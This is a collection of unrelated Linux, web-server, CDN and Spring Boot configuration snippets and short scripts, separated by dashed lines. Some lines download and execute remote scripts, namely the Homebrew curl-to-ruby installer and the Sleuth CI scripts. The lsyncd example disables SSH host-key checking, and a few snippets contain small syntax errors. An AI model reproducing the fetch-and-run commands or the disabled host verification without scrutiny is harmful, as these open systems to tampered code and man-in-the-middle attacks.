--------------------------------------------------------------------------------------------------------
ifconfig | grep inet6
If that produced no output then ipv6 is already disabled. Otherwise first open (as root) the file /etc/modprobe.d/aliases and locate the following line:

alias net-pf-10 ipv6
and replace it with

alias net-pf-10 off
Then open /etc/modprobe.d/blacklist and add the following at the end of the file:

# disable ipv6
blacklist ipv6
Next you'll have to reboot the system since that seems to be the only way to get already loaded ipv6 modules out of memory.

It should be noted that editing only /etc/modprobe.d/blacklist has the same end result of getting ipv6 disabled but a log entry like

modprobe: WARNING: Not loading blacklisted module ipv6
will get added every time something in the system tries to access the net using ipv6. That can happen often in a busy system so there's no point filling log files with it.
--------------------------------------------------------------------------------------------------------
The purpose of this page is to describe how UTF-8 can be disable in Ubuntu / Debian console. At least Ubuntu releases starting from Dapper have UTF-8 enabled by default after a clean install has been done. Checking the current status is simple:

$ echo $LANG
en_US.UTF-8
If the result is anything else than en_US.UTF-8 then UTF-8 shouldn't be enabled and there's no point in reading the rest of this page unless generating locales is the point of interest.

Check /etc/default/locale and /etc/environment as root (so that you can edit it). One of these files will contain line similar to these, LANG is the one you are searching for:

LANG="en_US.UTF-8"
LANGUAGE="en_FI:en"
The LANGUAGE setting depends of what you have selected during the beginning of the install process and usually doesn't nee to be changed. Remove UTF-8 from the LANG setting so that after editing that line will look like:

LANG="en_US"
Save the changes and close the file. Remember to check both files!

Next it's time to generate some new locales because en_US doesn't probably exist yet. Open /var/lib/locales/supported.d/local and if will look like:

en_US.UTF-8 UTF-8
and make it look like:

en_US ISO-8859-1
en_US.UTF-8 UTF-8
Also any other locale that needs to be generated should be added to that file. For example Finnish users might want to have fi_FI ISO-8859-1 in there too. Remeber to save the file after editing.

Now it's time to generate those new locales. As usual, run the following as root.

$ locale-gen
Generating locales...
...
Generation complete.
local-gen will list all locales included in /var/lib/locales/supported.d/local and generate those if necessary. Finally just log out and back in again. UTF-8 should now be disable. That can be checked in the same way we started:

$ echo $LANG
en_US
Ubuntu 12.04 (and possibly also Debian) appendix
(status as of 5.8.2012)
A change done in January 2012 that was introduced in Ubuntu 12.04 causes the file .pam_environment to be created to the user home directory usually when logging in X. The content of that file is created from /etc/default/locale but .UTF-8 is forced after each entry even if the original didn't contain such. This results UTF-8 getting forced even if it has been disabled in /etc/default/locale. The easiest way to fix this is to edit (as root) /usr/share/language-tools/save-to-pam-env and add the following before “exit 0” near the end of the file:

sed -i -e 's:\.UTF-8::g' "$homedir/.pam_environment"
Log out and back in again. Now the .pam_environment shouldn't anymore contain traces of UTF-8.
--------------------------------------------------------------------------------------------------------
#!/bin/bash
 
if [ $# -eq "1" ]; then
        beep -f 3000 -l 50
        for (( ; ; )) ; do
                pin=`ping -c 1 -w 1 "$1" | grep -c "bytes from"`
                if [ $pin -eq 1 ]; then
                        beep -f 3000 -l 50
                        echo "* `date +%H:%M:%S` online!"
                else
                        echo "`date +%H:%M:%S` timeout"
                fi
                sleep 2
        done
else
        echo "Target parameter missing!"
fi
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python
 
import xml.etree.ElementTree as ET
doc = ET.parse('valgrind.xml')
errors = doc.findall('//error')
 
out = open("cpputest_valgrind.xml","w")
out.write('<?xml version="1.0" encoding="UTF-8"?>\n')
out.write('<testsuite name="valgrind" tests="'+str(len(errors))+'" errors="0" failures="'+str(len(errors))+'" skip="0">\n')
errorcount=0
for error in errors:
    errorcount=errorcount+1
 
    kind = error.find('kind')
    what = error.find('what')
    if  what == None:
        what = error.find('xwhat/text')
 
    stack = error.find('stack')
    frames = stack.findall('frame')
 
    for frame in frames:
        fi = frame.find('file')
        li = frame.find('line')
        if fi != None and li != None:
            break
 
    if fi != None and li != None:
        out.write('    <testcase classname="ValgrindMemoryCheck" name="Memory check '+str(errorcount)+' ('+kind.text+', '+fi.text+':'+li.text+')" time="0">\n')
    else:
        out.write('    <testcase classname="ValgrindMemoryCheck" name="Memory check '+str(errorcount)+' ('+kind.text+')" time="0">\n')
    out.write('        <error type="'+kind.text+'">\n')
    out.write('  '+what.text+'\n\n')
 
    for frame in frames:
        ip = frame.find('ip')
        fn = frame.find('fn')
        fi = frame.find('file')
        li = frame.find('line')
        bodytext = fn.text
        bodytext = bodytext.replace("&","&amp;")
        bodytext = bodytext.replace("<","&lt;")
        bodytext = bodytext.replace(">","&gt;")
        if fi != None and li != None:
            out.write('  '+ip.text+': '+bodytext+' ('+fi.text+':'+li.text+')\n')
        else:
            out.write('  '+ip.text+': '+bodytext+'\n')
 
    out.write('        </error>\n')
    out.write('    </testcase>\n')
out.write('</testsuite>\n')
out.close()
--------------------------------------------------------------------------------------------------------
npm install moment

var moment = require('moment');
moment().format();
--------------------------------------------------------------------------------------------------------
Header unset Etag
FileETag none

FileETag INode MTime Size
--------------------------------------------------------------------------------------------------------
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
brew install ffmpeg
ffmpeg -i input.mp4 -profile:v baseline -level 3.0 -s 640x360 -start_number 0 -hls_time 10 -hls_list_size 0 -f hls index.m3u8
--------------------------------------------------------------------------------------------------------
add_header Content-Security-Policy-Report-Only: "default-src 'none'; script-src http://wordpress.keycdn.net";
Header set Content-Security-Policy-Report-Only "default-src 'none'; script-src http://wordpress.keycdn.net;"
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Content-Security-Policy" value="default-src 'self';" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
--------------------------------------------------------------------------------------------------------
http {
    include /etc/nginx/mime.types;
    charset UTF-8;
    ...
}

AddType 'text/html; charset=UTF-8' html

<meta http-equiv="content-type" content="text/html;charset=UTF-8">
--------------------------------------------------------------------------------------------------------
sudo vi /etc/php5/fpm/php.ini
cgi.fix_pathinfo=0
sudo service php5-fpm restart

server {
    listen 80;
    server_name www.old-website.com;
    return 301 $scheme://www.new-website.com$request_uri;
}

server {
    ...
    rewrite ^(/download/.*)/media/(.*)\..*$ $1/mp3/$2.mp3 last;
    rewrite ^(/download/.*)/audio/(.*)\..*$ $1/mp3/$2.ra last;
    return 403;
    ...
}

if ($http_user_agent ~ MSIE) {
    rewrite ^(.*)$ /msie/$1 break;
}

if ($http_cookie ~* "id=([^;]+)(?:;|$)") {
    set $id $1;
}

if ($request_method = POST) {
    return 405;
}

if ($invalid_referer) {
    return 403;
}
--------------------------------------------------------------------------------------------------------
RewriteCond %{HTTP_HOST} example.com
RewriteRule (.*) http://www.example.com$1

server {
    listen 80;
    server_name example.com;
    return 301 http://www.example.com$request_uri;
}

server {
    listen 80;
    server_name www.example.com;
    # ...
}

location ~ \.php$ {
    if ($http_x_pull ~* "secretkeyname") {
        return 405;
    }
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass unix:/var/run/php5-fpm.sock;
    fastcgi_index index.php;
    include fastcgi_params;
}

RewriteEngine On
RewriteCond %{HTTP:X-Pull} secretkeyname
RewriteRule \.(html|php)$ - [F]

vi nginx.conf
server {
    listen 80 default_server;
    # Define the document root of the server e.g /var/www/html
    root /var/www/html;

    location /nginx_status {
        # Enable Nginx stats
        stub_status on;
        # Only allow access from your IP e.g 1.1.1.1 or localhost #
        allow 127.0.0.1;
        allow 1.1.1.1
        # Other request should be denied
        deny all;
    }
}

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
    AddOutputFilterByType DEFLATE application/x-font
    AddOutputFilterByType DEFLATE application/x-font-opentype
    AddOutputFilterByType DEFLATE application/x-font-otf
    AddOutputFilterByType DEFLATE application/x-font-truetype
    AddOutputFilterByType DEFLATE application/x-font-ttf
    AddOutputFilterByType DEFLATE application/x-javascript
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE font/opentype
    AddOutputFilterByType DEFLATE font/otf
    AddOutputFilterByType DEFLATE font/ttf
    AddOutputFilterByType DEFLATE image/svg+xml
    AddOutputFilterByType DEFLATE image/x-icon
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/xml
</IfModule>

gzip on;
gzip_disable "msie6";
gzip_vary on;
gzip_proxied any;
gzip_comp_level 6;
gzip_buffers 16 8k;
gzip_http_version 1.1;
gzip_types application/javascript application/rss+xml application/vnd.ms-fontobject application/x-font application/x-font-opentype application/x-font-otf application/x-font-truetype application/x-font-ttf application/x-javascript application/xhtml+xml application/xml font/opentype font/otf font/ttf image/svg+xml image/x-icon text/css text/javascript text/plain text/xml;
--------------------------------------------------------------------------------------------------------
location ~* \.(png|jpg|jpeg|gif)$ {
    expires 365d;
    add_header Cache-Control "public, no-transform";
}

location ~* \.(js|css|pdf|html|swf)$ {
    expires 30d;
    add_header Cache-Control "public, no-transform";
}

<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=2592000, public"
</filesMatch>

## EXPIRES CACHING ##
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpg "access 1 year"
    ExpiresByType image/jpeg "access 1 year"
    ExpiresByType image/gif "access 1 year"
    ExpiresByType image/png "access 1 year"
    ExpiresByType text/css "access 1 month"
    ExpiresByType text/html "access 1 month"
    ExpiresByType application/pdf "access 1 month"
    ExpiresByType text/x-javascript "access 1 month"
    ExpiresByType application/x-shockwave-flash "access 1 month"
    ExpiresByType image/x-icon "access 1 year"
    ExpiresDefault "access 1 month"
</IfModule>
## EXPIRES CACHING ##
--------------------------------------------------------------------------------------------------------
<script>
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://cdn.yourdomain.com/local-ga.js', 'ga');

    ga('create', 'UA-xxxxxxx-x', 'auto');
    ga('send', 'pageview');
</script>
--------------------------------------------------------------------------------------------------------
function remove_querystring_var($url, $key) {
    $url = preg_replace('/(.*)(?|&)' . $key . '=[^&]+?(&)(.*)/i', '$1$2$4', $url . '&');
    $url = substr($url, 0, -1);
    return ($url);
}
--------------------------------------------------------------------------------------------------------
<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=84600, public"
</filesMatch>

location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
    expires 2d;
    add_header Cache-Control "public, no-transform";
}

header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
--------------------------------------------------------------------------------------------------------
server {
    set $cache_uri $request_uri;

    # bypass cache if POST requests or URLs with a query string
    if ($request_method = POST) {
        set $cache_uri 'nullcache';
    }

    if ($query_string != "") {
        set $cache_uri 'nullcache';
    }

    # bypass cache if URLs containing the following strings
    if ($request_uri ~* "(/wp-admin/|/xmlrpc.php|/wp-(app|cron|login|register|mail).php|wp-.*.php|/feed/|index.php|wp-comments-popup.php|wp-links-opml.php|wp-locations.php|sitemap(index)?.xml|[a-z0-9-]+-sitemap([0-9]+)?.xml)") {
        set $cache_uri 'nullcache';
    }

    # bypass cache if the cookies containing the following strings
    if ($http_cookie ~* "comment_author|wordpress_[a-f0-9]+|wp-postpass|wordpress_logged_in") {
        set $cache_uri 'nullcache';
    }

    # custom sub directory e.g. /blog
    set $custom_subdir '';

    # default html file
    set $cache_enabler_uri '${custom_subdir}/wp-content/cache/cache-enabler/${http_host}${cache_uri}index.html';

    # webp html file
    if ($http_accept ~* "image/webp") {
        set $cache_enabler_uri '${custom_subdir}/wp-content/cache/cache-enabler/${http_host}${cache_uri}index-webp.html';
    }

    location / {
        gzip_static on; # this directive is not required but recommended
        try_files $cache_enabler_uri $uri $uri/ $custom_subdir/index.php?$args;
    }

    ...
}

# BEGIN Cache Enabler
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    # set blog sub path
    SetEnvIf Request_URI "^(.*)$" SUB_PATH=/wp-content/cache/cache-enabler/

    # set Cache Enabler path
    SetEnvIf Request_URI "^(.*)$" CE_PATH=$1

    <IfModule mod_mime.c>
        # webp HTML file
        RewriteCond %{ENV:CE_PATH} /$
        RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
        RewriteCond %{REQUEST_METHOD} !=POST
        RewriteCond %{QUERY_STRING} =""
        RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
        RewriteCond %{HTTP:Accept-Encoding} gzip
        RewriteCond %{HTTP:Accept} image/webp
        RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html.gz -f
        RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html.gz [L]

        # gzip HTML file
        RewriteCond %{ENV:CE_PATH} /$
        RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
        RewriteCond %{REQUEST_METHOD} !=POST
        RewriteCond %{QUERY_STRING} =""
        RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
        RewriteCond %{HTTP:Accept-Encoding} gzip
        RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html.gz -f
        RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html.gz [L]

        AddType text/html .gz
        AddEncoding gzip .gz
    </IfModule>

    # webp HTML file
    RewriteCond %{ENV:CE_PATH} /$
    RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
    RewriteCond %{REQUEST_METHOD} !=POST
    RewriteCond %{QUERY_STRING} =""
    RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
    RewriteCond %{HTTP:Accept} image/webp
    RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html -f
    RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html [L]

    # default HTML file
    RewriteCond %{ENV:CE_PATH} /$
    RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
    RewriteCond %{REQUEST_METHOD} !=POST
    RewriteCond %{QUERY_STRING} =""
    RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
    RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html -f
    RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html [L]
</IfModule>
# END Cache Enabler

<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=84600, public"
</filesMatch>

location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
    expires 2d;
    add_header Cache-Control "public, no-transform";
}

header('Cache-Control: max-age=84600');
--------------------------------------------------------------------------------------------------------
sudo apt-get update
sudo apt-get install lsyncd

vi /etc/lsyncd.lua

settings {
    logfile = "/var/log/lsyncd/lsyncd.log",
    statusFile = "/var/log/lsyncd/lsyncd-status.log",
    statusInterval = 20
}

sync {
    default.rsync,
    source="full path to your directory",
    target="username_for_keyCDN@rsync.keycdn.com:YOURZONE/",
    rsync = {
        archive = false,
        acls = false,
        chmod = "D2755,F644"
        compress = true,
        links = false,
        owner = false,
        perms = false,
        verbose = true,
        rsh = "/usr/bin/ssh -p 22 -o StrictHostKeyChecking=no"
    }
}
--------------------------------------------------------------------------------------------------------
sudo apt-get install mtr
yum install mtr
pacman -S mtr
brew install mtr

mtr --report domainx.com
mtr -n --report 8.8.8.8
--------------------------------------------------------------------------------------------------------
Open the rsyslog conf file and add the following lines

vi /etc/rsyslog.conf

# provides UDP syslog reception
module(load="imudp")
Create and open your custom config file.

vi /etc/rsyslog.d/00-custom.conf
# Templates
template(name="ReceiveFormat" type="string" string="%msg:39:$%\n")

# UDP ruleset mapping
input(type="imudp" port="514" ruleset="customRuleset")

# Custom ruleset
ruleset(name="customRuleset") {
    if ($msg contains '366c3df6-93dd-4ec0-a218-aec9d191c59e') then {
        /var/log/cdn.log;ReceiveFormat
        stop
    }
}

service rsyslog restart
netstat -na | grep ":<defined port>"
tcpdump port <defined port>
tail -f /var/log/cdn.log
--------------------------------------------------------------------------------------------------------
echo QUIT | openssl s_client -connect cdn.yourdomain.com:443 -servername cdn.yourdomain.com -tls1 -tlsextdebug -status
echo -n '{path}{secret}{timestamp}' | openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =
echo -n '/path/to/file1.jpgmysecret1384719072' | openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =
--------------------------------------------------------------------------------------------------------
var crypto = require('crypto'),
    secret = 'your_secret',
    path = '/path/to/your/file.jpg';

// define expiry (e.g. 120 seconds)
var expire = Math.round(Date.now()/1000) + 120;

// generate md5 token
var md5String = crypto
    .createHash("md5")
    .update(path + secret + expire)
    .digest("binary");

// encode and format md5 token
var token = new Buffer(md5String, 'binary').toString('base64');
token = token.replace(/\+/g, '-').replace(/\//g, '_').replace(/\=/g, '');

// return secure token
console.log('http://demo-1.kxcdn.com' + path + '?token=' + token + '&expire=' + expire);
--------------------------------------------------------------------------------------------------------
spring.cloud.stream.kafka.binder.headers=bar
spring.cloud.stream.bindings.output.destination=foobar
spring.cloud.stream.bindings.input.destination=foobar
spring.cloud.stream.bindings.input.group=foo

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.stream.annotation.EnableBinding;
import org.springframework.cloud.stream.messaging.Processor;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.integration.support.MessageBuilder;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageHandler;
import org.springframework.messaging.MessagingException;

@SpringBootApplication
@EnableBinding(Processor.class)
public class So38961697Application {

    public static void main(String[] args) throws Exception {
        ConfigurableApplicationContext context = SpringApplication.run(So38961697Application.class, args);
        Foo foo = context.getBean(Foo.class);
        foo.start();
        foo.send();
        Thread.sleep(30000);
        context.close();
    }

    @Bean
    public Foo foo() {
        return new Foo();
    }

    private static class Foo {

        @Autowired
        Processor processor;

        public void send() {
            Message<?> m = MessageBuilder.withPayload("foo")
                    .setHeader("bar", "baz")
                    .build();
            processor.output().send(m);
        }

        public void start() {
            this.processor.input().subscribe(new MessageHandler() {

                @Override
                public void handleMessage(Message<?> m) throws MessagingException {
                    System.out.println(m);
                }

            });
        }

    }

}
--------------------------------------------------------------------------------------------------------
buildscript {

    ext {
        springBootVersion = '1.3.0.RELEASE'
    }

    repositories {
        maven {
            url "https://plugins.gradle.org/m2/"
        }
        mavenLocal()
        mavenCentral()
}

    dependencies {
        classpath ("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}") 
        classpath ("io.spring.gradle:dependency-management-plugin:0.5.2.RELEASE")
        classpath ("mysql:mysql-connector-java:5.1.34")
        classpath ("org.sonarqube.gradle:gradle-sonarqube-plugin:1.1")
    }
}

repositories {
        maven {
            url "https://plugins.gradle.org/m2/"
            url "https://repo.spring.io/snapshot"
            url "https://repo.spring.io/milestone"
        }
        mavenLocal()
        mavenCentral()
}


apply plugin: 'java'
apply plugin: 'eclipse-wtp'
apply plugin: 'idea'
apply plugin: 'spring-boot' 
apply plugin: 'io.spring.dependency-management' 
apply plugin: 'org.sonarqube'
apply plugin: "jacoco"
apply plugin: "sonar-runner"


group    = 'com.api'

def build_version=project.properties['build_version'] ?: "SNAPSHOT"
version  = "${build_version}"

ext.packaging = 'jar'

jar {
   baseName = "userassociations-v1"
}


sourceCompatibility = 1.8
targetCompatibility = 1.8

sourceSets {
    generated {
        java {
            srcDirs = ['src/main/generated']
        }
    }
}


configurations {
    providedRuntime
     querydslapt
}

jacoco {

    reportsDir = file("build/tmp/jacoco.exec")
}

test{
    ignoreFailures = true    
}

sonarqube {
  properties {
    property "sonar.projectName", "User-associations-V1"
    property "sonar.projectKey", "org.sonarqube:User-associations-V1"
    property "sonar.sourceEncoding", "UTF-8"
    property "sonar.host.url", "${sonar_host}"
    property "sonar.login", "${sonar_username}"
    property "sonar.password", "${sonar_password}"
    property "sonar.jacoco.reportPath", "build/jacoco/test.exec"
    property "sonar.java.source property", "1.8"

  }
}

dependencyManagement {
    imports { 
        mavenBom "org.springframework.cloud:spring-cloud-starter-parent:Brixton.RC1" 
    }
}

dependencies {
    compile         ("org.springframework.boot:spring-boot-starter-actuator")
    compile         ("org.springframework.cloud:spring-cloud-starter-eureka")
    compile         ("org.springframework.cloud:spring-cloud-config-client")
    compile("org.springframework.cloud:spring-cloud-starter-hystrix:1.0.6.RELEASE")
    compile("org.springframework.cloud:spring-cloud-starter-bus-amqp:1.0.6.RELEASE")
    compile("org.springframework.cloud:spring-cloud-netflix-hystrix-amqp:1.0.6.RELEASE")
    compile         ("org.codehaus.sonar-plugins.java:sonar-jacoco-plugin:2.3")
    compile         ("org.springframework.boot:spring-boot-starter-web")
    compile         ("org.codehaus.jackson:jackson-mapper-asl:1.9.2")
    compile         ("mysql:mysql-connector-java:5.1.34")
    compile         ("org.springframework:spring-webmvc:4.2.2.RELEASE")
    compile         ("org.springframework.boot:spring-boot-starter-data-jpa")
    providedRuntime ("org.springframework.boot:spring-boot-starter-tomcat")
    testCompile     ("org.springframework.boot:spring-boot-starter-test") 
    querydslapt     ("org.hibernate:hibernate-jpamodelgen:5.0.5.Final")
    compile 'org.springframework.cloud:spring-cloud-starter-sleuth:1.0.0.M1'
    compile 'org.springframework.cloud:spring-cloud-sleuth-core:1.0.0.M1' 
}


eclipse {
    classpath {
         containers.remove('org.eclipse.jdt.launching.JRE_CONTAINER')
         containers ('org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.8')
    }
}

task generateQueryDSL(type: JavaCompile, group: 'build', description: 'Generates the QueryDSL query types') {
    source = sourceSets.main.java
    classpath = configurations.compile + configurations.querydslapt
    options.compilerArgs = [
            "-proc:only"
    ]
    destinationDir = sourceSets.generated.java.srcDirs.iterator().next()
}

compileJava {
    dependsOn generateQueryDSL
    source generateQueryDSL.destinationDir
}

compileGeneratedJava {
    dependsOn generateQueryDSL
    options.warnings = false
    classpath += sourceSets.main.runtimeClasspath
}

clean {
    delete sourceSets.generated.java.srcDirs
}

task wrapper(type: Wrapper) {
    gradleVersion = '2.9'
}
--------------------------------------------------------------------------------------------------------
int rand7()
{
    int vals[5][5] = {
        { 1, 2, 3, 4, 5 },
        { 6, 7, 1, 2, 3 },
        { 4, 5, 6, 7, 1 },
        { 2, 3, 4, 5, 6 },
        { 7, 0, 0, 0, 0 }
    };

    int result = 0;
    while (result == 0)
    {
        int i = rand5();
        int j = rand5();
        result = vals[i-1][j-1];
    }
    return result;
}

int i;
do
{
  i = 5 * (rand5() - 1) + rand5();  // i is now uniformly random between 1 and 25
} while(i > 21);
// i is now uniformly random between 1 and 21
return i % 7 + 1;  // result is now uniformly random between 1 and 7

public static int random_7() {
    int returnValue = 0;
    while (returnValue == 0) {
        for (int i = 1; i <= 3; i++) {
            returnValue = (returnValue << 1) + random_5_output_2();
        }
    }
    return returnValue;
}

private static int random_5_output_2() {
    while (true) {
        int flip = random_5();

        if (flip < 3) {
            return 0;
        }
        else if (flip > 3) {
            return 1;
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Bean
    public TomcatServletWebServerFactory containerFactory() {
        return new TomcatServletWebServerFactory() {
            protected void customizeConnector(Connector connector) {
                int maxSize = 50000000;
                super.customizeConnector(connector);
                connector.setMaxPostSize(maxSize);
                connector.setMaxSavePostSize(maxSize);
                if (connector.getProtocolHandler() instanceof AbstractHttp11Protocol) {

                    ((AbstractHttp11Protocol <?>) connector.getProtocolHandler()).setMaxSwallowSize(maxSize);
                    logger.info("Set MaxSwallowSize "+ maxSize);
                }
            }
        };

    }
--------------------------------------------------------------------------------------------------------
   @Bean
        @ConditionalOnMissingBean(name = "redisTemplate")
        public RedisTemplate<Object, Object> redisTemplate(
                RedisConnectionFactory redisConnectionFactory)
                        throws UnknownHostException {
            RedisTemplate<Object, Object> template = new RedisTemplate<Object, Object>();
            template.setConnectionFactory(redisConnectionFactory);
            return template;
        }
--------------------------------------------------------------------------------------------------------
spring.main.allow-bean-definition-overriding=true

@LoadBalanced
--------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>org.springframework.cloud</groupId>
    <artifactId>spring-cloud-sleuth-zipkin2</artifactId>
    <version>2.0.0.M4</version>
</dependency>
--------------------------------------------------------------------------------------------------------
@PreAuthorize("#username == authentication.principal.username")
@PostAuthorize("returnObject.username == authentication.principal.nickName")
public CustomUser securedLoadUserDetail(String username) {
    return userRoleRepository.loadUserByUserName(username);
}
--------------------------------------------------------------------------------------------------------
Test
@WithMockUser(username = "john", roles = { "VIEWER" })
public void givenRoleViewer_whenCallGetUsername_thenReturnUsername() {
    String userName = userRoleService.getUsername();
     
    assertEquals("john", userName);
}
--------------------------------------------------------------------------------------------------------
random.number=${random.int}
random.long=${random.long}
random.uuid=${random.uuid}
--------------------------------------------------------------------------------------------------------
package examples;

public class ExampleBean {

    // Fields omitted

    @ConstructorProperties({"years", "ultimateAnswer"})
    public ExampleBean(int years, String ultimateAnswer) {
        this.years = years;
        this.ultimateAnswer = ultimateAnswer;
    }
}
--------------------------------------------------------------------------------------------------------
@ContextConfiguration
@TestPropertySource("/my-test.properties")
public class IntegrationTests {
    // tests
}

@ContextConfiguration
@TestPropertySource("foo=bar", "bar=foo")
public class IntegrationTests {
    // tests
}

@SpringBootTest(properties = {"foo=bar", "bar=foo"})
public class IntegrationTests {
    // tests
}
--------------------------------------------------------------------------------------------------------
#!/bin/bash

set -o errexit

mkdir -p target

REPO_URL="https://github.com/spring-cloud-samples/sleuth-documentation-apps.git"
BRANCH_NAME="master"

pushd target
git clone "${REPO_URL}"

pushd sleuth-documentation-apps
./scripts/runAcceptanceTests.sh

popd
popd



#!/bin/bash

set -o errexit

mkdir -p target

SCRIPT_URL="https://raw.githubusercontent.com/spring-cloud-samples/brewery/master/runAcceptanceTests.sh"
AT_WHAT_TO_TEST="SLEUTH"
BRANCH_NAME="master"

cd target

curl "${SCRIPT_URL}" --output runAcceptanceTests.sh

chmod +x runAcceptanceTests.sh

echo "Killing all running apps"
./runAcceptanceTests.sh -t "${AT_WHAT_TO_TEST}" -n -br "${BRANCH_NAME}"

./runAcceptanceTests.sh --whattotest "${AT_WHAT_TO_TEST}" --killattheend -br "${BRANCH_NAME}"



#!/bin/bash

set -o errexit

mkdir -p target

SCRIPT_URL="https://raw.githubusercontent.com/spring-cloud-samples/brewery/master/runAcceptanceTests.sh"
AT_WHAT_TO_TEST="SLEUTH_STREAM"
BRANCH_NAME="master"

cd target

curl "${SCRIPT_URL}" --output runAcceptanceTests.sh

chmod +x runAcceptanceTests.sh

echo "Killing all running apps"
./runAcceptanceTests.sh -t "${AT_WHAT_TO_TEST}" -n -br "${BRANCH_NAME}"

./runAcceptanceTests.sh --whattotest "${AT_WHAT_TO_TEST}" --killattheend -br "${BRANCH_NAME}"


#!/bin/bash

echo "Running JMH Benchmarks"
./mvnw clean install -DskipTests --projects benchmarks --also-make -Pbenchmarks,jmh
java -Djmh.ignoreLock=true -jar benchmarks/target/benchmarks.jar org.springframework.cloud.sleuth.benchmarks.jmh.* -rf csv -rff jmh-result.csv | tee target/benchmarks.log


#!/bin/bash

echo "Killing the remaining apps - if something went wrong previously"
pkill -f SleuthBenchmarkingSpringApp || echo "No apps to kill"

echo "Running JMeter Benchmarks"
./mvnw clean verify --projects benchmarks --also-make -Pbenchmarks,jmeter
echo "Killing the remaining apps - if something went wrong after the tests"
pkill -f SleuthBenchmarkingSpringApp || echo "No apps to kill"
--------------------------------------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE suppressions PUBLIC
	"-//Puppy Crawl//DTD Suppressions 1.1//EN"
	"https://www.puppycrawl.com/dtds/suppressions_1_1.dtd">
<suppressions>
	<suppress files=".*/test/.*" checks="JavadocVariable"/>
	<suppress files=".*FinishedSpanHandlerTests.*" checks="LineLengthCheck"/>
	<suppress files=".*GrpcTracingIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*IgnoreAutoConfiguredSkipPatternsIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*RestTemplateTraceAspectIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithContextPathWithBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithContextPathWithoutBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithoutContextPathWithBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithoutContextPathWithoutBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SleuthNewSpanParserAnnotationDisableTests.*" checks="LineLengthCheck"/>
	<suppress files=".*SpanAdjusterTests.*" checks="LineLengthCheck"/>
	<suppress files=".*SpringDataInstrumentationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TagPropagationFinishedSpanHandlerTest.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceAsyncIntegrationTests.*" checks="LineLengthCheck"/>
